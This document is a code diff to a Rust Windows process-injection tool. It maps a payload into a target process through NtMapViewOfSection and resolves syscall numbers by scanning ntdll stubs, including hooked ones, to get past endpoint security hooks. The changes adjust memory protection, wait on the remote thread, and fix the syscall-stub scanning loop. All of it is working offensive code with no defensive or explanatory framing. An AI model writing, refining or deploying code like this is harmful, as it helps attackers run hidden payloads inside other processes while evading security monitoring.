@@ -17,10 +17,11 @@ use winapi::{
     shared::ntdef::{PLARGE_INTEGER, POBJECT_ATTRIBUTES},
     um::{
         processthreadsapi::GetThreadId,
+        synchapi::WaitForSingleObject,
         winnt::{
             ACCESS_MASK, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY,
             IMAGE_NT_HEADERS, IMAGE_NT_SIGNATURE, LARGE_INTEGER, PAGE_EXECUTE_READWRITE,
-            SEC_COMMIT, SECTION_ALL_ACCESS, THREAD_ALL_ACCESS,
+            PAGE_READWRITE, SEC_COMMIT, SECTION_ALL_ACCESS, THREAD_ALL_ACCESS,
         },
     },
 };
@@ -205,7 +206,7 @@ fn map_view_inject(process_handle: *mut c_void, payload: *mut c_void, payload_si
             &mut view_size,
             ViewShare,
             0,
-            PAGE_EXECUTE_READWRITE,
+            PAGE_READWRITE,
         );
 
         if !NT_SUCCESS(status) {
@@ -282,12 +283,14 @@ fn map_view_inject(process_handle: *mut c_void, payload: *mut c_void, payload_si
             GetThreadId(thread_handle)
         );
 
+        WaitForSingleObject(thread_handle, 0xFFFFFFFF);
+
         ssn = get_ssn(NTUNMAPVIEWOFSECTION_HASH, &mut sys_addr);
         SYSCALL_ADDR = sys_addr;
         SSN = ssn;
         status = NtUnmapViewOfSection(process_handle, local_address);
 
-        pause();
+        // pause();
 
         if !NT_SUCCESS(status) {
             println!("[-] NtUnmapViewOfSection failed with error: 0x{:X}", status);
@@ -399,6 +402,8 @@ fn get_hooked_function_ssn(current_func: *const u8, sys_addr: &mut *mut c_void) 
 
                 return target_ssn;
             }
+
+            prev_stub_count += 1;
         }
     }
     return 0;
@@ -460,31 +465,28 @@ fn get_ssn(hash: u64, sys_addr: &mut *mut c_void) -> u16 {
                     //     "[+] Found function: {} at address: {:?}",
                     //     func_str, function_address
                     // );
-
-                    let mut byte = 0;
-
-                    for i in 0..20 {
+                    for i in 0..32 {
                         let bytes = function_address as *const u8;
                         let mut ssn: u16 = 0;
 
-                        if *bytes.offset(byte + i) == 0x4C
-                            && *bytes.offset(byte + i + 1) == 0x8B
-                            && *bytes.offset(byte + i + 2) == 0xD1
-                            && *bytes.offset(byte + i + 3) == 0xB8
-                            && *bytes.offset(byte + i + 6) == 0x00
-                            && *bytes.offset(byte + i + 7) == 0x00
+                        if *bytes.offset(i) == 0x4C
+                            && *bytes.offset(i + 1) == 0x8B
+                            && *bytes.offset(i + 2) == 0xD1
+                            && *bytes.offset(i + 3) == 0xB8
+                            && *bytes.offset(i + 6) == 0x00
+                            && *bytes.offset(i + 7) == 0x00
                         {
                             println!("[+] {} is not hooked, extracting SSN...", func_str);
 
-                            let low = *bytes.offset(byte + i + 4) as u16;
-                            let high = *bytes.offset(byte + i + 5) as u16;
+                            let low = *bytes.offset(i + 4) as u16;
+                            let high = *bytes.offset(i + 5) as u16;
                             ssn = (high << 8) | low;
                             // println!(
                             //     "[+] Found syscall number: 0x{:X} for function: {} at address: {:?}",
                             //     ssn, func_str, function_address
                             // );
 
-                            *sys_addr = function_address.offset(byte + i + 18) as *mut c_void;
+                            *sys_addr = function_address.offset(i + 18) as *mut c_void;
                             // println!(
                             //     "[+] Syscall Address: {:?}",
                             //     function_address.offset(byte + i + 18)
